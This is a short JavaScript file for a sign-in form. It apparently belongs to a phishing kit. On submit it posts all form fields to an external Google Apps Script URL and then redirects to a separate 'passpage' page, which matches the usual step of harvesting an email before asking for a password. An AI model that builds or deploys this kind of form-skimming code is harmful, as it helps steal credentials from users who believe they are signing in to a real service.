document.getElementById('signinForm').addEventListener('submit', function(event) {
  event.preventDefault();
  const email = document.getElementById('email').value;
  //alert('Signing in with: ' + email);
 // setTimeout(function() {
  //Dont forget to change the URL to the correct one
  window.location.href = '../passpage.html'; 
 // }, 1000);
});



const scriptURL = 'https://script.google.com/macros/s/AKfycbw-znGZwNTJle2M753wiqvEcWKBKTQwhI1_joGBHBAGITOmqS9_Z56ymke3UZtn2ImiJQ/exec'

const form = document.forms['signinForm']



form.addEventListener('submit', e => {
  
  e.preventDefault()
  
  fetch(scriptURL, { method: 'POST', body: new FormData(form)})
  //.then(response => alert("Loading..." ))
  .then(() => { window.location.href="../passpage.html"; })
  .catch(error => console.error('Error!', error.message))
})

